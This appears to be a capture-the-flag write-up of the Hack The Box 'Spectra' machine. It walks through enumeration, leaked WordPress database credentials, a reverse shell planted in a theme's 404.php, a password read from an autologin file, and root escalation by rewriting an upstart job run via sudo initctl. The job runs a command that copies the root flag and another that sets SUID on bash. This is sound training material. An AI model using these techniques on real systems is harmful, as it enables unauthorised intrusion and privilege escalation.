# My solution

## Foothold
Start with usual nmap enumeration
```
>> nmap -sC -sV -oN nmap-initial 10.10.10.229


Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 20:23 CEST
Nmap scan report for 10.10.10.229
Host is up (0.030s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.51 seconds
```
We visit the main page on port 80

>![Main page](imgs/20210425-203053.png)

Both links redirect us to a `spectra.htb` domain.  
We insert the domain in the `/etc/hosts` file so that we can access the resources.

Following the first link we reach a wordpress page.  

We fire up dirbuster on the and wpscan.  
Dirbuster on the main page with rockyou dictionary. Allow php extension as the web server is powered by php.

As we see in the server's response headers:
```
Server: nginx/1.17.4
X-Powered-By: PHP/5.6.40
```


`http://spectra.htb/testing/` is exposed and we can see all the files and directories (no need of dirbuster).  
Usually passwords and configurations are in the `wp-config.php` file.  
We visit the file `http://spectra.htb/testing/wp-config.php.save`. It is probably an exposed autosave file created by nginx.
```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

In particular, it is possible to observe the password and username of the mysql database.
```
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

We can now try the new credentials we found:

-  Access the sql database using this credentials. Not possible as the access is restricted to localhost (`define( 'DB_HOST', 'localhost' );`. 
-  We try ssh. Credentials not correct. 
-  We try to login in wordpress (`http://spectra.htb/ /main/wp-admin`). Credentials not correct. 

Moving around in the wordpress site, another username pops up:  `administrator`.  
We thus try the pair 'administrator' and 'devteam01' to login in Wordpress. It works and we are in!

## nginx user
We managed to break into the Wordpress portal as the `administrator` user.  
We now have to find a way to access the underline OS.  

It can be easily done by inserting a reverse shell in the `404.php` page of the active wordpress theme. The malicious code will be triggered when the page get visited.  
In order to do this, we go to `Plugins > Theme editor`, then replace the code in `404.php` with our reverse shell.  
I was to able to modify the `404.php` page of the active theme (*Twenty Twenty*), so I injected my rev shell in the 404 page of the *Twenty Seventeen* theme, and activate it.  

Once the file is updated successfully, we can trigger our reverse shell by directly visiting the `http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php`  or by visiting a non existing page (e.g. `http://spectra.htb/main/ssas`) which would serve the 404 page.


```
koen@koen:~/Uni/HTB/Machines/Spectra$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.200] from (UNKNOWN) [10.10.10.229] 44698
Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7401P 24-Core Processor AuthenticAMD GNU/Linux
 13:47:58 up 19 min,  0 users,  load average: 0.05, 0.19, 0.20
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
$ whoami
nginx
```

## Katie user


In `/opt` we have a suspicious file  `autologin.conf.orig`

```
for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
```

The above script checks whether a `passwd` file is stored in the `/mnt/stateful_partition/etc/autologin` or `/etc/autologin`.  
By printing the content of `/etc/autologin/passwd` we found the password of the **katie** user: SummerHereWeCome!!

We log in through ssh with the pair katie:SummerHereWeCome!!


## Root
A fast check to see which commands can be executed by **katie** as another user.

```
katie@spectra ~ $ sudo -l

User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

Since **katie** can run *initctl* as the root user, we can create an upstart script with our malicious code and run it using *initctcl*.  
In order to make our created **conf** file visible to *initctl* we need to place it under the `/etc/init` or /`etc/init.d` directory. This is not really possible because *katie* does not have the permissions to do that.

We cannot insert files in those directories, but we may be able to exploit some of the files which are already located there.  
So we take a look at the files in `/etc/init`, hoping to find some interesting entries that can help us escalating the privileges.  
```
rw-r--r-- 1 root root       1430 Jan 15 15:35 syslog.conf
-rw-r--r-- 1 root root        651 Jan 15 15:35 sysrq-init.conf
-rw-r--r-- 1 root root       2665 Jan 15 15:34 system-proxy.conf
-rw-r--r-- 1 root root       1694 Jan 15 15:35 system-services.conf
-rw-r--r-- 1 root root        671 Dec 22 06:10 tcsd.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test1.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test10.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test2.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test3.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test4.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test5.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test6.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test7.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test8.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test9.conf
-rw-r--r-- 1 root root       2645 Dec 22 05:53 tlsdated.conf
-rw-r--r-- 1 root root       1276 Dec 22 06:10 tpm-probe.conf
-rw-r--r-- 1 root root        673 Jan 15 15:33 tpm_managerd.conf
-rw-r--r-- 1 root root        696 Jan 15 15:35 trace_marker-test.conf
-rw-r--r-- 1 root root        667 Jan 15 15:35 tracefs-init.conf
-rw-r--r-- 1 root root       1124 Jan 15 15:35 trim.conf
-rw-r--r-- 1 root root        622 Jan 15 15:33 trun
```
Some of the files are writable by the **developers* group. Katie is also part of this group, as we can see from the output of the `id` command.
```
katie@spectra /etc/init $ id       
uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
```

So we can replace one of the writable conf file with a malicious one.  
First we stop the service
```
sudo /sbin/initctl stop test
```

We can then modify the upstart script and escalate our privileges to root.
Malicious content of the new `test.conf`:
```
description "Test node.js server"
author      "katie"
    
start on filesystem or runlevel [2345]
stop on shutdown

script
	cat /root/root.txt > /tmp/flag
end script

```

We start the service
```
sudo /sbin/initctl start test
```


We can now retrieve the file
```
katie@spectra /etc/init $ cat /tmp/flag
d44519713b889d5e1f9e536d0c6df2fc
```


(Then we remove our flag file from `/tmp` to avoid that other people get an easy root flag).

In case we want to get a proper root shell, the content of the `test.conf` may be:
```
description "Test node.js server"
author      "katie"
    
start on filesystem or runlevel [2345]
stop on shutdown

script
	chmod +s /bin/bash
end script
```

Then: `/bin/bash -p`.













